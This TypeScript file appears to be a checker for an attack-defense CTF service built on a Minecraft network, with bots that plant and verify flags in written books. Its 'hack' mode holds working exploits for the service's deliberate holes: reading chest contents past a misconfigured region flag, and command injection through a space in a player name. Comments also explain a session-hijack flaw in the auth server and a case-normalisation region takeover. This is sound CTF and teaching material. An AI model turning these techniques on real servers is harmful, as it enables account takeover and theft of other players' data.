import { argv, env, fetch, password, sleep } from "bun";
import mineflayer, { Chest, Dispenser, type Bot } from "mineflayer";
import { pathfinder, goals, Movements } from "mineflayer-pathfinder";
import mcproto from "minecraft-protocol"
import { createTask, once, withTimeout } from "./tricks";
import {randomBytes, randomInt} from "node:crypto";
import {Item} from "prismarine-item";
import {Block} from "prismarine-block";
import {Vec3} from "vec3";
import {USERAGENTS} from "./useragents";
import {v4} from "uuid";
import {appendFileSync, writeFileSync} from "node:fs";


namespace yggdrasil {
    interface LoginWithPasswordOption {
        username: string,
        password: string,
    }

    const headers = {
        "User-Agent": "Java/21.0.4",
        "Content-Type": "application/json"
    };
    function urlForAction(address: string, action: string): string {
        return `http://${address}:25566/authlib-injector/authserver/${action}`
    }

    export async function loginWithPassword(address: string, option: LoginWithPasswordOption): Promise<mcproto.SessionOption> {
        const clientToken = v4();
        const resp = await fetchRejectToDown(urlForAction(address, "authenticate"), {
            method: "POST",
            headers,
            body: JSON.stringify({
                agent: {
                    name: "Minecraft",
                    version: 1
                },
                username: option.username,
                password: option.password,
                clientToken,
                requestUser: false
            })
        });
        if (resp.status !== 200) {
            throw new MumbleError(`Authenticate for ${JSON.stringify(option)} returned ${resp.status} with ${await resp.text()}`, "error in authenticate");
        }
        const data = await resp.json();
        if (data.error != null || data.error != null) {
            throw new MumbleError(`Authenticate returned error ${JSON.stringify(data)}`, "error in authenticate");
        }
        if (typeof(data.accessToken) !== "string") {
            throw new MumbleError(`Authenticate returned wrong type for accessToken ${JSON.stringify(data)}`, "error in authenticate");
        }
        if (typeof(data.clientToken) !== "string") {
            throw new MumbleError(`Authenticate returned wrong type for clientToken ${JSON.stringify(data)}`, "error in authenticate");
        }
        if (typeof(data.selectedProfile?.id) !== "string") {
            throw new MumbleError(`Authenticate returned wrong type for selectedProfile.id ${JSON.stringify(data)}`, "error in authenticate");
        }
        if (typeof(data.selectedProfile?.name) !== "string") {
            throw new MumbleError(`Authenticate returned wrong type for selectedProfile.name ${JSON.stringify(data)}`, "error in authenticate");
        }
        if (data.clientToken !== clientToken) {
            throw new MumbleError(`Server returned unexpected clientToken ${data.clientToken} !== ${clientToken}`, "error in authenticate");
        }

        return {
            accessToken: data.accessToken,
            clientToken: data.clientToken,
            selectedProfile: {
                id: data.selectedProfile.id,
                name: data.selectedProfile.name,
            }
        };
    }

    interface ValidateOption {
        accessToken: string,
        clientToken: string,
        expectSuccess: boolean,
    }

    export async function validate(address: string, option: ValidateOption): Promise<void> {
        const resp = await fetchRejectToDown(urlForAction(address, "validate"), {
            method: "POST",
            headers,
            body: JSON.stringify({
                accessToken: option.accessToken,
                clientToken: option.clientToken
            })
        });
        if (resp.status !== 204 && option.expectSuccess) {
            throw new MumbleError(`We expected valid, but server said it's invalid session ${resp.status} with ${await resp.text()}`, "error in session validate");
        } else if (resp.status === 204 && !option.expectSuccess) {
            throw new MumbleError(`We expected invalid, but server said it's valid session ${resp.status} with ${await resp.text()}`, "error in session validate");
        }
    }

    export async function invalidate(address: string, option: ValidateOption): Promise<void> {
        const resp = await fetchRejectToDown(urlForAction(address, "invalidate"), {
            method: "POST",
            headers,
            body: JSON.stringify({
                accessToken: option.accessToken,
                clientToken: option.clientToken,
            })
        });
        if (resp.status !== 204 && option.expectSuccess) {
            throw new MumbleError(`We expected successful invalidation, but server returned ${resp.status} with ${await resp.text()}`, "error in session invalidate");
        } else if (resp.status === 204 && !option.expectSuccess) {
            throw new MumbleError(`We expected error invalidation, but server returned ${resp.status} with ${await resp.text()}`, "error in session invalidate");
        }
    }
}


class MumbleError extends Error {
    checkerText: string;

    constructor(message: string, checkerText: string) {
        super(message);
        this.checkerText = checkerText;
    }
}
class NotFoundError extends MumbleError {}

class DownError extends Error {}

async function wrapRejectToDown<T>(promise: Promise<T>): Promise<T> {
    try {
        return await promise;
    } catch(err) {
        throw new DownError("wrapped down", {cause: err});
    }
}

async function fetchRejectToDown(url: string, options: FetchRequestInit): Promise<Response> {
    return await wrapRejectToDown(fetch(url, options));
}

function getBookText(book: Item): string {
    if (book.nbt == null) {
        return "";
    } else {
        let result = "";
        (book as any).nbt.value.pages.value.value.forEach((page: string, i: number) => result += page);
        return result;
    }
}

async function findChests(bot: BotWithLog, radius: number = 10): Promise<Block[]> {
    const blocks = await (async () => {
        for(let i = 0; i < 2; ++i) {
            const blocks = bot.findBlocks({matching: [bot.registry.blocksByName["chest"].id], maxDistance: radius, count: 10});
            if (blocks.length === 0) {
                await sleep(3000);
            } else {
                return blocks;
            }
        }
        throw new NotFoundError(`Can't find chests`, "Error during chest find");
    })();
    bot.print(`Found ${blocks.length} chests in ${radius} radius`);
    return blocks.map((vec3Block) => {
        const block = bot.blockAt(vec3Block);
        if (block == null) {
            throw new Error(`Got null chest block`);
        } else {
            return block;
        }
    });
}

async function writeSignBook(bot: BotWithLog, text: string): Promise<Item> {
    const books = bot.inventory.items().filter(({ name }) => name === 'writable_book');
    if (books.length === 0) {
        throw new MumbleError("Can't find writable_book in inventory", "book is missing");
    } else {
        const match = text.match(/.{1,200}/g);
        if (match == null) {
            throw new Error(`Can't split string ${text}`)
        } else {
            const nSlot = books[0].slot;
            await (bot as any).signBook(nSlot, match, bot.username, randomBytes(4).toString("hex"));
            bot.print("Book signed!");
            const bookItem = bot.inventory.slots[nSlot];
            
            if (bookItem == null) {
                throw new Error(`Signed book is null slot(${nSlot}): ${bot.inventory.slots.map((item) => item?.name)}`)
            } else {
                return bookItem;
            }
        }
    }
}

async function openChest(bot: BotWithLog, block: Block): Promise<Chest> {
    bot.print(`Goto chest at ${block.position}`);
    for (let i = 0; i < 2; ++i) {
        await bot.pathfinder.goto(new goals.GoalGetToBlock(block.position.x, block.position.y, block.position.z));
        bot.print(`Moved to chest${block.position}, now in ${bot.entity.position}`)
        try {
            return await bot.openContainer(block);
        } catch(err) {
            bot.print(`Can't open chest, retrying: ${err}`);
        }
    }
    throw new MumbleError(`Could not open chest ${bot.entity.position} at ${block.position}`, "Error during working with chests");
}

async function findItemInChest(bot: BotWithLog, name: string, predicate: (chest: Chest | Dispenser, item: Item) => Promise<boolean>): Promise<Block> {
    for(const block of await findChests(bot)) {
        const chest = await openChest(bot, block);
        const requiredItems = chest.containerItems().filter((item) => item.name === name);
        bot.print(`Opened chest, it contains ${requiredItems.length} ${name}`);
        for(const item of requiredItems) {
            if (await predicate(chest, item)) {
                chest.close();
                return block;
            }
        }
        chest.close();
    }
    throw new NotFoundError(`Can't find ${name} in chests`, "Error during working with chests")
}

async function waitMove(bot: BotWithLog, position: Vec3) {
    const task = createTask();
    const listener = () => {
        bot.print(`moving from ${bot.entity.position} to ${position}`);
        if (bot.entity.position.distanceTo(position) < 10) {
            bot.removeListener("move", listener);
            bot.print(`moved from ${bot.entity.position} to ${position}`);
            task.finish();
        }
    };
    bot.on("move", listener);
    setTimeout(() => {
        bot.removeListener("move", listener);
        task.cancel(new Error(`Can't get from ${bot.entity.position} to ${position}`));
    }, 10000);
    bot.print(`waiting for ${bot.entity.position} to ${position}`);
    await bot.wrap(task.promise);
    await bot.wrap(bot.waitForChunksToLoad());
}

interface FullLoginOptions {
    address: string,
    serverHost: string,
    session: mcproto.SessionOption,
    version: string
}

interface BotWithLog extends mineflayer.Bot {
    print: (text: string) => void
    wrap<T>(promise: Promise<T>): Promise<T>
    home: Vec3
}

async function joinServer(options: FullLoginOptions): Promise<BotWithLog> {
    const username = options.session.selectedProfile.name;
    const bot = mineflayer.createBot({
        host: options.address,
        fakeHost: options.serverHost,
        username,
        session: options.session,
        sessionServer: `http://${options.address}:25566/authlib-injector/sessionserver`,
        auth: "mojang",
        port: 25565,
        version: options.version,
        skipValidation: true,
        // hideErrors: true,
        plugins: {"chatInject": (bot, options) => {
            const chatOrig = bot.chat;
            (bot as BotWithLog).print = (text: string) => {
                writeToLog(`[${username}] ${text}`)
            };
            bot.chat = (message: string) => {
                chatOrig(message);
                (bot as BotWithLog).print(`sent "${message}"`)
            };
        }}
    }) as BotWithLog;
    (bot as BotWithLog).wrap = async(promise) => {
        try {
            return await promise;
        } catch(err) {
            bot.print(`${err}`);
            throw err;
        }
    };
    bot.on("message", (msg, position) => {
        bot.print(`msg(${position}): ${msg}`);
        if (position === "system" && msg.toString().includes("You were kicked from")) {
            bot.print("Unexpected kick")
            exitProcess("DOWN");
        }
    });
    bot.on("end", async (reason: string) => {
        bot.print(`end: ${reason}`);
        if (reason !== "disconnect.quitting") {
            bot.print("Unexpected disconnect")
            exitProcess("DOWN");
        }
    });
    bot.on("error", (error: Error) => {
        bot.print(`error: ${error}`);
    });
    bot.on("login", () => {
        bot.print("login");
    });
    bot.on("kicked", (reason: string) => {
        bot.print(`kicked: ${reason}`);
    });
    bot.loadPlugin(pathfinder);

    await bot.wrap(once(bot, "spawn") as unknown as Promise<void>);
    const movements = new Movements(bot);
    movements.canDig = false;
    bot.pathfinder.setMovements(movements);
    bot.print(`Spawned at ${bot.entity.position}`);
    await bot.wrap(bot.waitForChunksToLoad());
    return bot;
}

interface UserData {
    username: string,
    password: string,
}

const alphabet = "abcdefghijklmnopqrstuvwxyz0123456789";
function randomString(n: number): string {
    return [...Array(n).keys()].map(() => alphabet[randomInt(alphabet.length)]).join("");
}

function generateRandomUser(): UserData {
    return {
        username: randomString(5),
        password: randomString(10),
    };
}

async function registerUser(addr: string, userData: UserData): Promise<void> {
    writeToLog(`registering ${userData.username}:${userData.password}`);
    const url = `http://${addr}:25566/register`;
    const browserUA = USERAGENTS[randomInt(USERAGENTS.length)];
    await fetchRejectToDown(url, {
        method: "GET",
        headers: {
            "User-Agent": browserUA
        },
    });
    const resp = await fetchRejectToDown(url, {
        method: "POST",
        headers: {
            "User-Agent": browserUA
        },
        body: new URLSearchParams({
            'username': userData.username,
            'playerName': userData.username,
            'password': userData.password
        }),
        redirect: "manual"
    });
    if (!resp.headers?.get("location")?.includes("/success")) {
        throw new Error(`Can't register: ${resp.status} ${resp.url}`);
    }
}

async function checkWriteBook(bot: BotWithLog, bookText: string): Promise<void> {
    const bookItem = await bot.wrap(writeSignBook(bot, bookText));
    const chestBlock = (await findChests(bot))[0];
    const chest = await bot.wrap(openChest(bot, chestBlock));
    await bot.wrap(chest.deposit(bookItem.type, bookItem.metadata, bookItem.count));
    chest.close();
}

async function getRandomBot(serverHost: string, address: string): Promise<BotWithLog> {
    const userData = generateRandomUser();
    await registerUser(address, userData);
    const session = await yggdrasil.loginWithPassword(address, userData);
    const bot = await joinServer({session, serverHost, address, version: "1.16.5"});
    bot.home = bot.entity.position.clone();
    return bot;
}

async function switchToPlanetsServer(bot: BotWithLog) {
    bot.chat("/server planets");
    await bot.wrap(once(bot, "spawn") as unknown as Promise<void>);
    await bot.wrap(bot.waitForChunksToLoad());
    bot.home = bot.entity.position.clone();
    bot.print(`Spawned at ${bot.entity.position}`);
    await sleep(1000);
}

interface FlagId {
    session: mcproto.SessionOption,
    home: Vec3,
}

type StatusChecker = "OK" | "CORRUPT" | "MUMBLE" | "DOWN" | "CHECKER_ERROR";

function exitProcess(status: StatusChecker): never {
    writeToLog(`Ending with ${status}`);
    switch(status) {
        case "OK":
            process.exit(101);
        case "CORRUPT":
            process.exit(102);
        case "MUMBLE":
            process.exit(103);
        case "DOWN":
            process.exit(104);
        case "CHECKER_ERROR":
            process.exit(110);
    }
}

async function checkTravelHome(bot: BotWithLog): Promise<void> {
    bot.chat("/travel");
    await bot.wrap(waitMove(bot, bot.home));
};

function logPlayersAround(bot: BotWithLog) {
    const radius = 10;
    const playerNames = Object
        .values(bot.entities)
        .filter((entity) => entity.type === "player" && entity.position.distanceTo(bot.entity.position) < radius)
        .map((entity) => entity.username);
    bot.print(`Found ${playerNames.length} in radius ${radius}: ${playerNames}`);
}

async function main() {
    const args = argv.slice(2);
    if (args.length < 2) {
        writeToLog(`Not enough arguments ${args}`);
        exitProcess("CHECKER_ERROR");
    }
    const address = args[1];
    try {
        switch(args[0]) {
            case "check": {
                if (args.length == 2) {
                    const bookText = randomString(randomInt(30, 60));

                    const checkShareBook = async (botSharer: BotWithLog, botChecker: BotWithLog): Promise<void> => {
                        botSharer.chat(`/share ${botChecker.username}`);
                        await botSharer.wrap(withTimeout(botSharer.awaitMessage(/updated with new members/), 20000));
                        botChecker.chat(`/travel ${botSharer.username}`);
                        await waitMove(botChecker, botSharer.home);
                        await botChecker.wrap(findItemInChest(botChecker, "written_book", async (_, book) => getBookText(book).includes(bookText)));
                    };
                    const userData = generateRandomUser();
                    await registerUser(address, userData);
                    const session = await yggdrasil.loginWithPassword(address, userData);
                    const tokens = {accessToken: session.accessToken, clientToken: session.clientToken!};
                    await yggdrasil.validate(address, {...tokens, expectSuccess: true});
                    await yggdrasil.invalidate(address, {...tokens, expectSuccess: true});
                    await yggdrasil.validate(address, {...tokens, expectSuccess: false});

                    const bot1 = await getRandomBot(address, address);
                    await switchToPlanetsServer(bot1);
                    await checkWriteBook(bot1, bookText);
                    await checkTravelHome(bot1);
                    
                    await Promise.all([...Array(randomInt(1, 3)).keys()].map((i) => {
                        return (async () => {
                            await sleep(1000 * i + randomInt(5) * 1000);
                            const bot2 = await getRandomBot(address, address);
                            await switchToPlanetsServer(bot2);
                            await checkShareBook(bot1, bot2);
                            if (randomInt(0, 2) == 0) {
                                await checkTravelHome(bot2);
                            }
                            bot2.print("Done!")
                            bot2.quit();
                        })();
                    }));
                    bot1.quit();
                    exitProcess("OK");
                } else {
                    writeToLog(`Invalid count of args: ${args}`);
                    exitProcess("CHECKER_ERROR");
                }
                break;
            }
            case "put": {
                if (args.length == 5) {
                    // flag_id, flag, vuln
                    const flag = args[3];
                    if(args[4] === "1") {
                        const bot1 = await getRandomBot(address, address);
                        await switchToPlanetsServer(bot1);
                        await checkWriteBook(bot1, flag);

                        // private flag_id
                        if (bot1._client.session == null) {
                            bot1.print("Session is null");
                            exitProcess("CHECKER_ERROR");
                        } else {
                            logPlayersAround(bot1);
                            const flagId: FlagId = {session: bot1._client.session, home: bot1.home};
                            writeToLog(`Saving flagId ${JSON.stringify(flagId)}`);
                            writeFileSync(privateOutputFile, btoa(JSON.stringify(flagId)));
                            writeFileSync(publicOutputFile, `${bot1.username} (${flagId.home.x}, ${flagId.home.y}, ${flagId.home.z})`);
                            bot1.quit();
                            exitProcess("OK");
                        }
                    } else {
                        writeToLog(`Got unexpected vuln ${args[4]}`);
                        exitProcess("CHECKER_ERROR");
                    }
                } else {
                    writeToLog(`Invalid count of args: ${args}`);
                    exitProcess("CHECKER_ERROR");
                }
                break;
            }
            case "get": {
                if (args.length == 5) {
                    // flag_id, flag, vuln
                    const flag = args[3];
                    const flagId = JSON.parse(atob(args[2])) as FlagId;
                    flagId.home = new Vec3(flagId.home.x, flagId.home.y, flagId.home.z);
                    if (args[4] === "1") {
                        const bot = await joinServer({session: flagId.session, serverHost: address, address, version: "1.16.5"});
                        await switchToPlanetsServer(bot);
                        bot.home = flagId.home;
                        if (10 < bot.entity.position.distanceTo(bot.home)) {
                            await checkTravelHome(bot);
                        }
                        logPlayersAround(bot);
                        try {
                            await bot.wrap(findItemInChest(bot, "written_book", async (_, book) => getBookText(book).includes(flag)));
                        } catch(err) {
                            if (err instanceof NotFoundError) {
                                writeToLog(err.toString());
                                exitProcess("CORRUPT");
                            } else {
                                throw err;
                            }
                        }
                        
                        bot.print("Found flag");
                        bot.quit();
                        exitProcess("OK");
                    } else {
                        writeToLog(`Got unexpected vuln ${args[4]}`);
                        exitProcess("CHECKER_ERROR");
                    }
                } else {
                    writeToLog(`Invalid count of args: ${args}`);
                    exitProcess("CHECKER_ERROR");
                }
                break;
            }
            case "hack": {
                if (args.length == 4) {
                    if (args[2] === "1") {
                        // tldr; As a warmup just go to each chest and read the flags
                        // * When creating a region in the PlanetWorld plugin, we set the region.setFlag(Flags.BUILD, StateFlag.State.DENY); 
                        // It doesn't mean "you can't build", it means "This flag is unlike the others. It forces the checking of region membership"
                        // you can fix it by changing this line to 
                        // region.setFlag(Flags.BLOCK_BREAK, StateFlag.State.DENY);
                        // region.setFlag(Flags.BLOCK_PLACE, StateFlag.State.DENY);
                        // * You can read the nbt of items in a chest without taking them out,
                        // just use a custom minecraft client like mineflayer or azalea, or alternatively
                        // you can modify official client with fabric loader
                        const userData = generateRandomUser();
                        await registerUser(address, userData);
                        const bot = await joinServer({
                            session: await yggdrasil.loginWithPassword(address, userData),
                            serverHost: "planets.mc",
                            address,
                            version: "1.16.5"
                        });
                        const chests = await findChests(bot, 100);
                        for (let block of chests) {
                            const chest = await openChest(bot, block);
                            try {
                                await findItemInChest(bot, "written_book", async (_, item) => {
                                    bot.print(getBookText(item));
                                    return false;
                                });
                            } catch(err) {}
                            chest.close();
                        }
                        exitProcess("OK");
                    } else if (args[2] === "2") {
                        // tldr; Command injection in /share command, but it requires space character in playername
                        // You can register with space, but if you try to join the server by IP you get an error complaining about invalid name.
                        // When you join the server by IP address you join the lobby server which is a 1.21.1 paper server,
                        // server with the plugin is a 1.16.5 paper, where you can still have spaces in the name.
                        // In velocity (Minecraft proxy) config there is a field about joining server by host,
                        // so it's possible to join by hostname planets.mc to join the planets server directly.
                        // Also in proxy plugins we have viaversion and viabackwards, which allow joining server by different version client,
                        // so you can easily join both servers using 1.16.5 and 1.21.1 clients.
                        const userDataThief = {username: randomString(4), password: randomString(10)};
                        await registerUser(address, userDataThief);

                        const helperName = randomString(2);
                        const userDataHelper = {username: helperName + "planet", password: randomString(10)};
                        await registerUser(address, userDataHelper);

                        const userDataAttack = {username: `${args[3]}planet ${helperName}`, password: randomString(10)};
                        await registerUser(address, userDataAttack);
                    
                        const botAttack = await joinServer({
                            session: await yggdrasil.loginWithPassword(address, userDataAttack),
                            serverHost: "planets.mc",
                            address,
                            version: "1.16.5"
                        });
                        const botThief = await joinServer({
                            session: await yggdrasil.loginWithPassword(address, userDataThief),
                            serverHost: "planets.mc",
                            address,
                            version: "1.16.5"
                        });
                        await joinServer({
                            session: await yggdrasil.loginWithPassword(address, userDataHelper),
                            serverHost: "planets.mc",
                            address,
                            version: "1.16.5"
                        });

                        botAttack.chat(`/share ${botThief.username}`);
                        await botAttack.wrap(withTimeout(botAttack.awaitMessage(/updated with new members/), 20000));
                        botThief.chat(`/travel ${args[3]}`);
                        await once(botThief, "forcedMove");
                        await botThief.waitForChunksToLoad()
                        botThief.print(`Teleported to ${botThief.entity.position}`);

                        await findItemInChest(botThief, "written_book", async (_, item) => {
                            const text = getBookText(item);
                            if (0 < text.length) {
                                console.log(text);
                                return true;
                            } else {
                                return false;
                            }
                        });
                        exitProcess("OK");
                    } else if (args[2] == "3") {
                        // tldr; /session/minecraft/hasJoined only checks the username, so you can login as a checker
                        // 1) When you login to a minecraft server with online-mode enabled, your client sends
                        // a request to your authorisation server (in our case AxelAuth package) to /session/minecraft/join
                        // with accessToken and serverId which is some shared secret obtained through one of the first packets
                        // communicated with server.
                        // 2) The server then sends request to the same authorisation server at /session/minecraft/hasJoined with
                        // shared serverId and username. The current implementation doesn't check serverId, so you can /session/minecraft/join
                        // with your credentials (or just suppress it), then set the username to checker, so the server sends a request to /session/minecraft/hasJoined
                        // with your serverId and checker's name, getting the checker session
                    } else if (args[2] == "4") {
                        // Player names are not normalised, so you can register account with
                        // the same name as checker, but in a different case. Because of implementation details
                        // of the WorldGuard plugin, when you join, checkers region replaced by your region.
                        // com.sk89q.worldguard.protection.managers.index.HashMapIndex.performAdd
                        //     private void performAdd(ProtectedRegion region) {
                        //     checkNotNull(region);
                        //     region.setDirty(true);
                        //     synchronized (lock) {
                        //         String normalId = normalize(region.getId());
                        //         ProtectedRegion existing = regions.get(normalId);
                        //         // Casing / form of ID has changed
                        //         if (existing != null && !existing.getId().equals(region.getId())) {
                        //             removed.add(existing);
                        //         }
                        //         regions.put(normalId, region);
                        //         removed.remove(region);
                        //         ProtectedRegion parent = region.getParent();
                        //         if (parent != null) {
                        //             performAdd(parent);
                        //         }
                        //     }
                        // }
                        // So checker's region is not private, you have it's coordinates in attack data
                    } else {
                        writeToLog(`Got unexpected vuln ${args[4]}`);
                        exitProcess("CHECKER_ERROR");
                    }
                } else {
                    writeToLog(`Invalid count of args: ${args}`);
                    exitProcess("CHECKER_ERROR");
                }
                break;
            }
            default: {
                writeToLog(`Unknown mode ${args[0]}`);
                exitProcess("CHECKER_ERROR");
            }
        }
    } catch(err) {
        if (err instanceof MumbleError || err instanceof NotFoundError) {
            writeToLog(`Got MUMBLE type error: ${err}`);
            exitProcess("MUMBLE");
        } else if (err instanceof DownError) {
            writeToLog(`Got DOWN type error: ${err}`);
            exitProcess("DOWN");
        } else {
            writeToLog(`Got unknown error: ${err}`);
            exitProcess("CHECKER_ERROR");
        }
    }
}

const publicOutputFile = env.publicOutput!;
if (publicOutputFile == null) {
    writeToLog("env.publicOutput is missing");
    exitProcess("CHECKER_ERROR");
}

const privateOutputFile = env.privateOutput!;
if (privateOutputFile == null) {
    writeToLog("env.privateOutput is missing");
    exitProcess("CHECKER_ERROR");
}

const logOutputFile = env.logOutput!;
if (logOutputFile == null) {
    writeToLog("env.logOutput is missing");
    exitProcess("CHECKER_ERROR");
}

function writeToLog(text: string) {
    const time = new Date().toLocaleTimeString('de-DE');
    appendFileSync(logOutputFile, `${time} ${text}\n`);
}

await main();
